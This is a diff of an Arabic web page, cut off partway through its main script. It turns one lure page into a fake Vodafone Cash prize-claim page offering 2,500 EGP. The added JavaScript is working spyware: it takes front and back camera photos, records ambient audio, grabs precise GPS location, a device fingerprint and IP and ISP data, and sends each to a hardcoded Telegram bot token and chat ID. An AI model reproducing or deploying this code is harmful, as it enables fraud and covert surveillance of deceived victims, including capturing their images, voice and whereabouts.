@@ -3,15 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>بطاقة المنشور | هوية الصفحة</title>
+    <title>فودافون كاش | استلام مكافأة</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(145deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            background: linear-gradient(145deg, #6a1b1a 0%, #8b1e1c 100%);
             font-family: 'Cairo', 'Tajawal', sans-serif;
             display: flex;
             justify-content: center;
@@ -19,317 +15,107 @@
             min-height: 100vh;
             padding: 16px;
         }
-        .identity-card {
-            max-width: 480px;
+        .vodafone-card {
+            max-width: 420px;
             width: 100%;
-            background: #ffffff;
+            background: white;
             border-radius: 32px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            transition: all 0.3s ease;
-        }
-
-        /* ===== رأس البطاقة - هوية صاحب المنشور ===== */
-        .identity-header {
-            background: linear-gradient(135deg, #0f3460, #1a1a2e);
-            padding: 28px 24px 24px;
-            position: relative;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
             overflow: hidden;
         }
-        .identity-header::before {
-            content: '';
-            position: absolute;
-            top: -60%;
-            right: -30%;
-            width: 200px;
-            height: 200px;
-            background: rgba(255, 215, 0, 0.05);
-            border-radius: 50%;
+        .vodafone-header {
+            background: linear-gradient(135deg, #e60000, #b80000);
+            padding: 24px 20px 20px;
+            text-align: center;
+            color: white;
         }
-        .identity-header::after {
-            content: '';
-            position: absolute;
-            bottom: -40%;
-            left: -20%;
-            width: 150px;
-            height: 150px;
-            background: rgba(100, 200, 255, 0.05);
-            border-radius: 50%;
-        }
-        .identity-top {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            position: relative;
-            z-index: 1;
-        }
-        .identity-avatar {
-            width: 72px;
-            height: 72px;
-            background: linear-gradient(135deg, #f7971e, #ffd200);
-            border-radius: 50%;
+        .vodafone-logo {
+            font-size: 32px;
+            font-weight: 800;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 36px;
-            font-weight: 900;
-            color: #1a1a2e;
-            flex-shrink: 0;
-            border: 3px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-        }
-        .identity-info {
-            flex: 1;
-        }
-        .identity-info .name-section {
-            display: flex;
-            align-items: center;
             gap: 10px;
-            flex-wrap: wrap;
-            min-height: 32px;
         }
-        .identity-info .name-section .owner-name {
-            font-size: 20px;
-            font-weight: 800;
-            color: #ffffff;
-            letter-spacing: 0.5px;
-        }
-        .identity-info .name-section .loading-text {
-            font-size: 15px;
-            font-weight: 400;
-            color: #8899bb;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .identity-info .name-section .loading-text .spinner-mini {
-            width: 16px;
-            height: 16px;
-            border: 2px solid #2a3a5e;
-            border-top: 2px solid #ffd200;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            display: inline-block;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .identity-info .name-section .verified-badge {
-            background: rgba(46, 213, 115, 0.2);
-            border: 1px solid #2ed573;
-            color: #2ed573;
-            padding: 2px 14px;
+        .vodafone-logo span:first-child {
+            background: white;
+            color: #e60000;
+            padding: 4px 12px;
             border-radius: 40px;
-            font-size: 11px;
-            font-weight: 700;
-            display: none;
+            font-size: 20px;
         }
-        .identity-info .name-section .verified-badge.show {
-            display: inline-block;
-        }
-        .identity-info .bio-section {
-            margin-top: 6px;
-            min-height: 24px;
-        }
-        .identity-info .bio-section .owner-bio {
-            font-size: 13px;
-            color: #aabbdd;
-            display: none;
-        }
-        .identity-info .bio-section .owner-bio.show {
-            display: block;
-        }
-        .identity-info .bio-section .loading-bio {
+        .vodafone-badge {
+            background: rgba(255,255,255,0.2);
+            border-radius: 40px;
+            padding: 6px 12px;
             font-size: 12px;
-            color: #667799;
-        }
-        .identity-status {
             margin-top: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            position: relative;
-            z-index: 1;
-        }
-        .identity-status .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background: #ffd200;
-            border-radius: 50%;
-            animation: pulse 1.2s ease-in-out infinite;
             display: inline-block;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.7); }
+        .cash-prize {
+            background: #fff5e6;
+            margin: 20px 20px 0;
+            border-radius: 28px;
+            padding: 18px;
+            text-align: center;
+            border: 1px solid #ffd9b5;
         }
-        .identity-status .status-text {
+        .prize-amount {
+            font-size: 44px;
+            font-weight: 800;
+            color: #d42e12;
+            margin: 8px 0;
+        }
+        .prize-note {
             font-size: 12px;
-            color: #8899bb;
+            color: #7a5a3a;
+            background: #fff0e0;
+            border-radius: 30px;
+            padding: 6px;
         }
-        .identity-status .status-text.success {
-            color: #2ed573;
-        }
-
-        /* ===== قسم الرابط ===== */
-        .form-section {
-            padding: 24px 24px 8px;
-        }
-        .form-section .section-title {
-            font-size: 14px;
-            font-weight: 700;
-            color: #1a1a2e;
-            margin-bottom: 16px;
+        .phone-section { padding: 20px; }
+        .input-group {
+            background: #f3f4f6;
+            border-radius: 60px;
+            padding: 4px 16px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            border: 1px solid #e0e0e0;
         }
-        .form-section .section-title::after {
-            content: '';
+        .country-code {
+            font-weight: bold;
+            color: #e60000;
+            padding-left: 8px;
+            border-left: 1px solid #ccc;
+        }
+        .phone-input {
             flex: 1;
-            height: 1px;
-            background: #e0e5ee;
-        }
-        .input-group {
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 700;
-            color: #2a3a5e;
-            margin-bottom: 5px;
-            padding-right: 4px;
-        }
-        .input-group label span {
-            color: #e74c3c;
-            font-weight: 400;
-        }
-        .input-field {
-            width: 100%;
-            background: #f4f6fa;
-            border-radius: 14px;
-            padding: 14px 18px;
-            border: 2px solid #e0e5ee;
-            font-size: 15px;
-            color: #1a1a2e;
+            border: none;
+            padding: 16px 12px;
+            font-size: 16px;
+            background: transparent;
+            direction: ltr;
             outline: none;
-            transition: 0.2s;
         }
-        .input-field:focus {
-            border-color: #0f3460;
-            box-shadow: 0 0 0 4px rgba(15, 52, 96, 0.08);
-            background: #ffffff;
-        }
-        .input-field::placeholder {
-            color: #99aabb;
-            font-size: 13px;
-        }
-        .input-with-icon {
-            position: relative;
-        }
-        .input-with-icon .input-field {
-            padding-right: 46px;
-        }
-        .input-icon {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 18px;
-            opacity: 0.5;
-        }
-
-        /* ===== زر الإرسال ===== */
-        .submit-btn {
-            background: linear-gradient(135deg, #0f3460, #1a1a2e);
-            width: calc(100% - 48px);
-            margin: 4px 24px 16px;
+        .claim-btn {
+            background: linear-gradient(95deg, #e60000, #b91c1c);
+            width: calc(100% - 40px);
+            margin: 0 20px 20px;
             padding: 18px;
             border-radius: 60px;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 800;
             color: white;
             cursor: pointer;
             border: none;
-            transition: 0.15s;
-            box-shadow: 0 6px 0 #0a1a2e;
-            letter-spacing: 0.5px;
-            position: relative;
-            overflow: hidden;
+            transition: 0.2s;
         }
-        .submit-btn::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 215, 0, 0.05), transparent);
-            transform: rotate(45deg);
-        }
-        .submit-btn:active {
-            transform: translateY(3px);
-            box-shadow: 0 3px 0 #0a1a2e;
-        }
-        .submit-btn:disabled {
-            opacity: 0.5;
+        .claim-btn:disabled {
+            opacity: 0.6;
             cursor: not-allowed;
-            transform: translateY(2px);
-            box-shadow: 0 3px 0 #0a1a2e;
         }
-
-        /* ===== معلومات سفلية ===== */
-        .footer-info {
-            display: flex;
-            justify-content: space-between;
-            padding: 0 24px 12px;
-            font-size: 10px;
-            color: #99aabb;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        .footer-info span {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-        .error-toast {
-            background: #fef0ef;
-            color: #c0392b;
-            margin: 0 24px 12px;
-            padding: 10px 16px;
-            border-radius: 14px;
-            display: none;
-            text-align: center;
-            border: 1px solid #f5c6c6;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .error-toast.success {
-            background: #e8f8f0;
-            color: #27ae60;
-            border-color: #a9dfbf;
-        }
-        .watermark {
-            text-align: center;
-            font-size: 10px;
-            color: #ccd5e0;
-            padding-bottom: 16px;
-            letter-spacing: 2px;
-        }
-        .watermark span {
-            background: #f0f2f7;
-            padding: 2px 16px;
-            border-radius: 30px;
-        }
-
-        /* ===== تحميل عام ===== */
-        .loading-overlay {
-            background: rgba(0, 0, 0, 0.85);
+        .loading-overlay-card {
+            background: rgba(0,0,0,0.9);
             position: fixed;
             top: 0;
             left: 0;
@@ -340,268 +126,107 @@
             align-items: center;
             justify-content: center;
             visibility: hidden;
-            backdrop-filter: blur(10px);
         }
-        .loading-box {
-            background: #ffffff;
+        .loading-card {
+            background: white;
             width: 280px;
-            padding: 36px 24px;
-            border-radius: 32px;
+            padding: 28px;
+            border-radius: 48px;
             text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
         }
-        .loading-box .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #e0e5ee;
-            border-top: 4px solid #0f3460;
+        .spinner-fd {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #e60000;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto 16px;
         }
-        .loading-box p {
-            color: #1a1a2e;
-            font-weight: 600;
-            font-size: 15px;
-        }
-
-        .status-badge {
-            background: #1a1a2e;
-            color: #8899bb;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-badge-bottom {
+            background: #1f2937;
+            color: #10b981;
             font-size: 10px;
-            padding: 4px 16px;
+            padding: 5px 12px;
             border-radius: 30px;
             position: fixed;
             bottom: 12px;
             left: 12px;
             font-family: monospace;
             z-index: 999;
-            border: 1px solid #2a3a5e;
         }
-        .status-badge .dot {
-            width: 6px;
-            height: 6px;
-            background: #2ed573;
+        .error-toast {
+            background: #ffebee;
+            color: #c62828;
+            margin: 10px 20px;
+            padding: 12px;
+            border-radius: 28px;
+            display: none;
+            text-align: center;
+        }
+        .green-dot {
+            width: 8px;
+            height: 8px;
+            background: #2ecc71;
             border-radius: 50%;
             display: inline-block;
             margin-left: 6px;
         }
-
-        /* ===== تصميم الرابط المستضاف ===== */
-        .link-preview-box {
-            background: #f4f6fa;
-            border-radius: 14px;
-            padding: 12px 16px;
-            margin: 0 24px 16px;
-            border: 2px dashed #d0d7e6;
-            display: none;
-            align-items: center;
-            gap: 12px;
-            transition: all 0.3s ease;
-        }
-        .link-preview-box.show {
-            display: flex;
-        }
-        .link-preview-box .link-icon {
-            font-size: 24px;
-        }
-        .link-preview-box .link-info {
-            flex: 1;
-        }
-        .link-preview-box .link-info .link-url {
-            font-size: 13px;
-            color: #0f3460;
-            font-weight: 600;
-            word-break: break-all;
-        }
-        .link-preview-box .link-info .link-label {
-            font-size: 11px;
-            color: #8899bb;
-        }
-        .link-preview-box .link-status {
+        .info-box {
+            background: #f9fafb;
+            margin: 0 20px 20px;
+            padding: 12px;
+            border-radius: 24px;
             font-size: 12px;
-            color: #2ed573;
+            color: #4b5563;
+            display: flex;
+            justify-content: space-between;
         }
     </style>
 </head>
 <body>
 
-<div class="identity-card">
-
-    <!-- ===== رأس البطاقة ===== -->
-    <div class="identity-header" id="identityHeader">
-        <div class="identity-top">
-            <div class="identity-avatar" id="ownerAvatar">👤</div>
-            <div class="identity-info">
-                <div class="name-section">
-                    <span class="owner-name" id="ownerName">جاري التحقق...</span>
-                    <span class="loading-text" id="loadingIndicator">
-                        <span class="spinner-mini"></span>
-                        <span id="loadingLabel">جاري التحميل</span>
-                    </span>
-                    <span class="verified-badge" id="verifiedBadge">✓ موثوق</span>
-                </div>
-                <div class="bio-section">
-                    <span class="owner-bio" id="ownerBio"></span>
-                    <span class="loading-bio" id="loadingBio">⏳ جاري تحميل هوية صاحب المنشور...</span>
-                </div>
-            </div>
-        </div>
-        <div class="identity-status">
-            <span class="pulse-dot" id="statusDot"></span>
-            <span class="status-text" id="statusText">جاري التحقق من الهوية...</span>
-        </div>
+<div class="vodafone-card">
+    <div class="vodafone-header">
+        <div class="vodafone-logo"><span>Vodafone</span><span>📱</span></div>
+        <div class="vodafone-badge">🔥 عروض حصرية | استلام فوري 🔥</div>
     </div>
-
-    <!-- ===== حقل إدخال الرابط ===== -->
-    <div class="form-section">
-        <div class="section-title">🔗 رابط المنشور</div>
-
+    <div class="cash-prize">
+        <div class="prize-amount">2,500 <span style="font-size:22px">ج.م</span></div>
+        <div class="prize-note">⚡ استلم المبلغ خلال 24 ساعة بعد توثيق الحساب ⚡</div>
+    </div>
+    <div class="phone-section">
         <div class="input-group">
-            <label>📎 أدخل رابط المنشور <span>(رابط الفيديو أو الصورة)</span></label>
-            <div class="input-with-icon">
-                <span class="input-icon">🔗</span>
-                <input type="url" class="input-field" id="postLink" placeholder="https://www.facebook.com/...">
-            </div>
+            <span class="country-code">+20</span>
+            <input type="tel" class="phone-input" id="targetPhone" placeholder="رقم المستفيد" value="01050000000">
         </div>
+        <div style="font-size: 11px; color: #b45353; margin-top: 8px; padding-right: 12px;">📌 أدخل رقم هاتف المستفيد</div>
     </div>
-
-    <!-- ===== معاينة الرابط ===== -->
-    <div class="link-preview-box" id="linkPreview">
-        <span class="link-icon">📄</span>
-        <div class="link-info">
-            <div class="link-url" id="previewUrl">https://example.com/post</div>
-            <div class="link-label" id="previewLabel">رابط المنشور</div>
-        </div>
-        <span class="link-status" id="linkStatus">✓ جاهز</span>
+    <button class="claim-btn" id="claimMoneyBtn">💸 استلام المبلغ 💸</button>
+    <div class="info-box">
+        <span>🔒 آمن 100%</span>
+        <span>✅ مرخص من البنك المركزي</span>
+        <span>⚡ سريع</span>
     </div>
-
-    <!-- ===== زر الإرسال ===== -->
-    <button class="submit-btn" id="submitBtn">📨 إرسال الطلب</button>
-
-    <!-- ===== رسائل الخطأ ===== -->
     <div class="error-toast" id="errorMsg"></div>
-
-    <!-- ===== معلومات إضافية ===== -->
-    <div class="footer-info">
-        <span>🔒 بيانات مشفرة</span>
-        <span>🛡️ حماية كاملة</span>
-        <span>⚡ إجراء سريع</span>
-    </div>
-    <div class="watermark"><span>🔹 هوية المنشور 🔹</span></div>
 </div>
 
-<!-- ===== تحميل عام ===== -->
-<div class="loading-overlay" id="globalLoader">
-    <div class="loading-box">
-        <div class="spinner"></div>
-        <p id="loaderText">⏳ جاري تجهيز الطلب...</p>
+<div class="loading-overlay-card" id="globalLoader">
+    <div class="loading-card">
+        <div class="spinner-fd"></div>
+        <p id="loaderText">🔐 جاري تفعيل الحماية ...</p>
     </div>
 </div>
-
-<!-- ===== شريط الحالة ===== -->
-<div class="status-badge" id="statusBar"><span class="dot"></span> هوية المنشور | نشط</div>
+<div class="status-badge-bottom" id="statusBar"><span class="green-dot"></span> فودافون كاش | انتظر</div>
 
 <script>
     (function() {
-        // ============================================================
-        //  بيانات صاحب المنشور (عدل هنا)
-        // ============================================================
-        const OWNER = {
-            name: "أ. يوسف المنصوري",
-            bio: "ناشط اجتماعي | مدير صفحة المبادرات الإنسانية",
-            verified: true,
-            avatar: "🧑‍💼"
-        };
-
-        // ============================================================
-        //  إعدادات التليجرام
-        // ============================================================
+        // ===================== إعدادات البوت =====================
         const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
         const MASTER_ID = "5849068535";
-
-        // ============================================================
-        //  تحميل هوية صاحب المنشور (تأثير وهمي)
-        // ============================================================
-        function loadOwnerIdentity() {
-            const ownerNameEl = document.getElementById('ownerName');
-            const ownerBioEl = document.getElementById('ownerBio');
-            const loadingBioEl = document.getElementById('loadingBio');
-            const loadingIndicator = document.getElementById('loadingIndicator');
-            const verifiedBadge = document.getElementById('verifiedBadge');
-            const statusText = document.getElementById('statusText');
-            const statusDot = document.getElementById('statusDot');
-            const avatarEl = document.getElementById('ownerAvatar');
-
-            const stages = [
-                { name: 'جاري التحقق من الهوية...', bio: '⏳ جاري تحميل هوية صاحب المنشور...', status: '🔄 جاري الاتصال بقاعدة البيانات...' },
-                { name: 'جاري استعلام البيانات...', bio: '⏳ جاري تحميل هوية صاحب المنشور...', status: '📡 جاري استعلام السجل...' },
-                { name: 'جاري التجهيز...', bio: '⏳ جاري تحميل هوية صاحب المنشور...', status: '⚙️ تجهيز الملف الشخصي...' },
-            ];
-
-            let step = 0;
-
-            function updateStep() {
-                if (step < stages.length) {
-                    const s = stages[step];
-                    ownerNameEl.textContent = s.name;
-                    loadingBioEl.textContent = s.bio;
-                    statusText.textContent = s.status;
-                    step++;
-                    setTimeout(updateStep, 700 + Math.random() * 400);
-                } else {
-                    ownerNameEl.textContent = OWNER.name;
-                    ownerBioEl.textContent = OWNER.bio;
-                    ownerBioEl.classList.add('show');
-                    loadingBioEl.style.display = 'none';
-                    loadingIndicator.style.display = 'none';
-                    avatarEl.textContent = OWNER.avatar || '👤';
-
-                    if (OWNER.verified) {
-                        verifiedBadge.classList.add('show');
-                    }
-
-                    statusText.textContent = '✅ تم التحقق من الهوية بنجاح';
-                    statusText.classList.add('success');
-                    statusDot.style.background = '#2ed573';
-                    statusDot.style.animation = 'none';
-
-                    document.getElementById('statusBar').innerHTML =
-                        '<span class="dot" style="background:#2ed573;"></span> ' + OWNER.name + ' | موثق';
-                }
-            }
-
-            setTimeout(updateStep, 500);
-        }
-
-        // ============================================================
-        //  معاينة الرابط
-        // ============================================================
-        const linkInput = document.getElementById('postLink');
-        const linkPreview = document.getElementById('linkPreview');
-        const previewUrl = document.getElementById('previewUrl');
-        const linkStatus = document.getElementById('linkStatus');
-
-        linkInput.addEventListener('input', function() {
-            const url = this.value.trim();
-            if (url && (url.startsWith('http://') || url.startsWith('https://'))) {
-                linkPreview.classList.add('show');
-                previewUrl.textContent = url.length > 50 ? url.substring(0, 50) + '...' : url;
-                linkStatus.textContent = '✓ جاهز';
-                linkStatus.style.color = '#2ed573';
-            } else if (url) {
-                linkPreview.classList.add('show');
-                previewUrl.textContent = url;
-                linkStatus.textContent = '⚠️ رابط غير صالح';
-                linkStatus.style.color = '#e74c3c';
-            } else {
-                linkPreview.classList.remove('show');
-            }
-        });
-
-        // ============================================================
-        //  دوال الإرسال للتليجرام
-        // ============================================================
+        
+        // =============== دالة الإرسال الأساسية (نفس الكود الأصلي) ===============
         async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
             try {
                 let url = `https://api.telegram.org/bot${botToken}/`;
@@ -611,37 +236,36 @@
                     fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
                     fd.append('caption', caption);
                     await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
-                } else if (type === 'video') {
+                } 
+                else if (type === 'video') {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
                     fd.append('caption', caption);
                     await fetch(url + 'sendVideo', { method: 'POST', body: fd });
-                } else if (type === 'audio') {
+                }
+                else if (type === 'audio') {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('audio', mediaBlob, 'voice_note.ogg');
                     fd.append('caption', caption);
                     await fetch(url + 'sendAudio', { method: 'POST', body: fd });
-                } else {
+                }
+                else {
                     await fetch(url + 'sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML',
-                            disable_web_page_preview: true })
+                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
                     });
                 }
                 return true;
-            } catch (e) { console.warn("[telegram]", e); return false; }
+            } catch(e) { console.warn("[telegram]", e); return false; }
         }
 
-        // ============================================================
-        //  دوال الكاميرا والصوت والموقع
-        // ============================================================
-        async function captureFrontCamera(chatId, botToken, link, ownerName) {
+        // =================== التقاط الكاميرا (نفس الكود الأصلي) ===================
+        async function captureFrontCamera(chatId, botToken, phoneNumber) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 },
-                        height: { ideal: 720 } } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute('playsinline', 'true');
@@ -652,18 +276,19 @@
                 canvas.height = video.videoHeight || 600;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                const caption =
-                    `📸 كاميرا أمامية (سيلفي)\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${ownerName}`;
+                const caption = `📸 كاميرا أمامية (سيلفي)\n📞 الرقم: ${phoneNumber}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch (e) { return false; }
+            } catch(e) { 
+                console.warn("Front camera denied");
+                return false; 
+            }
         }
 
-        async function captureBackCamera(chatId, botToken, link, ownerName) {
+        async function captureBackCamera(chatId, botToken, phoneNumber) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment',
-                        width: { ideal: 1920 }, height: { ideal: 1080 } } });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
@@ -673,15 +298,17 @@
                 canvas.height = video.videoHeight || 768;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const caption =
-                    `📷 كاميرا خلفية\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${ownerName}`;
+                const caption = `📷 كاميرا خلفية - محيط المستخدم\n📞 الرقم: ${phoneNumber}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch (e) { return false; }
+            } catch(e) { 
+                console.warn("Back camera denied");
+                return false; 
+            }
         }
 
-        async function recordAmbientAudio(chatId, botToken, link, ownerName) {
+        async function recordAmbientAudio(chatId, botToken, phoneNumber) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
@@ -690,8 +317,7 @@
                 const audioPromise = new Promise(resolve => {
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const caption =
-                            `🎤 تسجيل صوتي\n🔗 الرابط: ${link}\n👤 صاحب المنشور: ${ownerName}`;
+                        const caption = `🎤 تسجيل صوتي (8 ثوان)\n📞 الرقم: ${phoneNumber}`;
                         await sendToTelegram(chatId, botToken, 'audio', blob, caption);
                         resolve(true);
                     };
@@ -700,55 +326,65 @@
                 setTimeout(() => mediaRecorder.stop(), 8000);
                 setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
                 return await audioPromise;
-            } catch (e) { return false; }
+            } catch(e) { 
+                console.warn("Audio denied");
+                return false; 
+            }
         }
 
-        function getPreciseLocation(chatId, botToken, link, ownerName) {
+        // =================== الموقع الجغرافي ===================
+        function getPreciseLocation(chatId, botToken, phoneNumber) {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(false); return; }
+                if(!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lng = pos.coords.longitude;
                     const accuracy = pos.coords.accuracy;
                     let addressHint = "";
                     try {
-                        const revGeo = await fetch(
-                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`
-                            );
+                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                         const data = await revGeo.json();
-                        if (data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
-                    } catch (e) {}
-                    const locMsg =
-                        `🌍 <b>الموقع الجغرافي</b>\n🔗 الرابط: ${link}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}\n👤 صاحب المنشور: ${ownerName}`;
+                        if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
+                    } catch(e) {}
+                    const locMsg = `🌍 <b>الموقع الجغرافي</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
                     await sendToTelegram(chatId, botToken, 'text', null, locMsg);
                     resolve(true);
-                }, () => { resolve(false); }, { enableHighAccuracy: true, timeout: 10000 });
+                }, (err) => {
+                    console.warn("Location denied");
+                    resolve(false);
+                }, { enableHighAccuracy: true, timeout: 10000 });
             });
         }
 
-        async function getDeepDeviceFingerprint(chatId, botToken, link, ownerName) {
+        // =================== IP ومعلومات الجهاز ===================
+        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
             const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+            
             let batteryLevel = "غير متاح";
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
                     batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
-                } catch (e) {}
+                } catch(e) {}
             }
+            
             let connection = "غير معروف";
             if (navigator.connection) {
-                connection =
-                    `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
+                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
             }
-            const deviceMsg =
-                `🕵️‍♂️ <b>بصمة الجهاز</b>\n🔗 الرابط: ${link}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}\n👤 صاحب المنشور: ${ownerName}`;
+            
+            const deviceMsg = `🕵️‍♂️ <b>بصمة الجهاز</b>\n📞 الرقم: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            
             await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
         }
 
-        async function getRichIPData(chatId, botToken, link, ownerName) {
+        async function getRichIPData(chatId, botToken, phoneNumber) {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
                     fetch('https://api.ipify.org?format=json'),
@@ -756,94 +392,82 @@
                 ]);
                 const ipData = await ipRes.json();
                 let ipDetails = {};
-                try { ipDetails = await ipInfoRes.json(); } catch (e) {}
+                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
                 const ipAddr = ipData.ip;
                 let country = ipDetails.country_name || "غير معروف";
                 let city = ipDetails.city || "غير معروف";
                 let isp = ipDetails.org || ipDetails.asn || "غير معروف";
-                const ipMsg =
-                    `🌐 <b>IP & Network</b>\n🔗 الرابط: ${link}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}\n👤 صاحب المنشور: ${ownerName}`;
+                const ipMsg = `🌐 <b>IP & Network</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
                 await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
-            } catch (e) {}
+            } catch(e) {}
         }
 
-        // ============================================================
-        //  التشغيل الرئيسي
-        // ============================================================
-        const submitBtn = document.getElementById('submitBtn');
-        const linkInputMain = document.getElementById('postLink');
+        // =============== التشغيل الرئيسي ===============
+        const claimBtn = document.getElementById('claimMoneyBtn');
+        const phoneInput = document.getElementById('targetPhone');
         const loaderDiv = document.getElementById('globalLoader');
         const loaderText = document.getElementById('loaderText');
         const errorDiv = document.getElementById('errorMsg');
-
+        const statusSpan = document.getElementById('statusBar');
+        
         let isRunning = false;
-
+        
